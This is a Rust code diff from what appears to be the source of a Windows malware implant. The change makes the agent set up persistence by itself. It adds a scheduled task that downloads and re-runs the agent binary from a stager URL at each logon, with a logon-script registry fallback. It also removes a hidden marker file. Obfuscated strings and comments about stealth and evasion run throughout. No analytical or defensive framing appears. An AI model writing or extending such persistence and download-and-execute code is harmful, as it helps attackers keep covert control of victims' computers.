@@ -1115,11 +1115,13 @@ pub fn establish_persistence(method: PersistenceMethod) -> Result<String, String
                 _ => unreachable!(),
             };
             
-            // For fileless methods, we need shellcode or download URL
-            // This would be provided by the C2 server or builder
-            // For now, return an error indicating configuration is needed
-            let config = persistence_fileless::FilelessConfig::default();
-            
+            // Inject the stager URL so download-based fileless methods work out-of-the-box
+            let config = persistence_fileless::FilelessConfig {
+                download_url: Some(crate::config::STAGER_URL.to_string()),
+                shellcode: None,
+                encryption_key: vec![],
+            };
+
             return persistence_fileless::establish_fileless_persistence(fileless_method, &config);
         }
         
@@ -1437,55 +1439,6 @@ const AUTO_PERSIST_TIME_ACCEL_THRESHOLD: u64 = 25; // If sleep < this, time acce
                                                    // we've already waited 3-5 minutes, so the system has been up long enough if it passed
                                                    // the initial environment checks. 10 minutes was too restrictive for VM testing.
 
-/// Marker file to check if persistence was already established in a previous run
-#[cfg(target_os = "windows")]
-fn get_persistence_marker_path() -> PathBuf {
-    let localappdata = env::var(obfstr!("LOCALAPPDATA").to_string())
-        .unwrap_or_else(|_| "C:\\Users\\Public".to_string());
-    PathBuf::from(format!(
-        "{}\\Microsoft\\Windows\\Caches\\{}.dat",
-        localappdata,
-        obfstr!("syscache")
-    ))
-}
-
-/// Check if persistence marker exists (already persisted in previous run)
-#[cfg(target_os = "windows")]
-fn persistence_marker_exists() -> bool {
-    get_persistence_marker_path().exists()
-}
-
-/// Create persistence marker file
-#[cfg(target_os = "windows")]
-fn create_persistence_marker() {
-    use std::fs;
-    let marker_path = get_persistence_marker_path();
-
-    // Create parent directory if needed
-    if let Some(parent) = marker_path.parent() {
-        let _ = fs::create_dir_all(parent);
-    }
-
-    // Write marker with some random-looking data
-    let marker_data = format!(
-        "{}{}{}",
-        std::process::id(),
-        std::time::SystemTime::now()
-            .duration_since(std::time::UNIX_EPOCH)
-            .unwrap_or_default()
-            .as_secs(),
-        get_machine_index()
-    );
-    let _ = fs::write(&marker_path, marker_data.as_bytes());
-
-    // Set hidden attribute
-    let attrib_exe = obfstr!("attrib").to_string();
-    let _ = Command::new(&attrib_exe)
-        .args(&["+h", "+s", marker_path.to_str().unwrap_or("")])
-        .creation_flags(0x08000000)
-        .output();
-}
-
 /// Schedule automatic persistence to be established after a delay
 /// This runs in a background thread and uses timing jitter for evasion
 ///
@@ -1502,13 +1455,6 @@ pub fn schedule_auto_persistence() {
     // Check if already done in this session
     if AUTO_PERSIST_DONE.load(Ordering::SeqCst) {
         debug_print!("DEBUG: [AUTO-PERSIST] Already done in this session, skipping");
-        return;
-    }
-
-    // Check if marker exists (persisted in previous run)
-    if persistence_marker_exists() {
-        debug_print!("DEBUG: [AUTO-PERSIST] Marker file exists, already persisted in previous run");
-        AUTO_PERSIST_DONE.store(true, Ordering::SeqCst);
         return;
     }
 
@@ -1616,41 +1562,40 @@ pub fn schedule_auto_persistence() {
         // Mark as done first to prevent race conditions
         AUTO_PERSIST_DONE.store(true, Ordering::SeqCst);
 
-        // Try COM Hijacking first (most stealthy)
-        // Note: WmiEvent enum now implements COM Hijacking (not actual WMI)
-        // The enum name is kept for backwards compatibility with "persistence wmi" command
-        match establish_persistence(PersistenceMethod::WmiEvent) {
+        // ================================================================
+        // FILELESS PERSISTENCE: Scheduled Task downloads & re-executes
+        // ================================================================
+        // PRIMARY: schtask downloads ester.exe to %TEMP%\<guid>.exe on logon
+        // – no agent binary is written to a permanent disk location.
+        match crate::persistence_fileless::persist_scheduled_task_download(
+            crate::config::STAGER_URL,
+        ) {
             Ok(msg) => {
                 debug_print!(
-                    "DEBUG: [AUTO-PERSIST] ✅ COM Hijacking established: {}",
+                    "DEBUG: [AUTO-PERSIST] ✅ Fileless schtask established: {}",
                     msg
                 );
-                // Create marker to avoid re-persisting on next run
-                create_persistence_marker();
-                debug_print!("DEBUG: [AUTO-PERSIST] ✅ Marker file created");
                 return;
             }
             Err(e) => {
                 debug_print!(
-                    "DEBUG: [AUTO-PERSIST] ⚠️ COM Hijacking failed: {}, trying fallback...",
+                    "DEBUG: [AUTO-PERSIST] ⚠️ Fileless schtask failed: {}, trying fallback...",
                     e
                 );
             }
         }
 
-        // Fallback to Registry Run (still stealthy with explorer.exe)
-        match establish_persistence(PersistenceMethod::RegistryRun) {
+        // FALLBACK: UserInitMprLogonScript (file-on-disk but stealthy registry location)
+        match establish_persistence(PersistenceMethod::WmiEvent) {
             Ok(msg) => {
                 debug_print!(
-                    "DEBUG: [AUTO-PERSIST] ✅ Registry persistence established: {}",
+                    "DEBUG: [AUTO-PERSIST] ✅ Logon script fallback established: {}",
                     msg
                 );
-                create_persistence_marker();
-                debug_print!("DEBUG: [AUTO-PERSIST] ✅ Marker file created");
             }
             Err(e) => {
                 debug_print!(
-                    "DEBUG: [AUTO-PERSIST] ❌ Failed to establish persistence: {}",
+                    "DEBUG: [AUTO-PERSIST] ❌ All persistence methods failed: {}",
                     e
                 );
             }
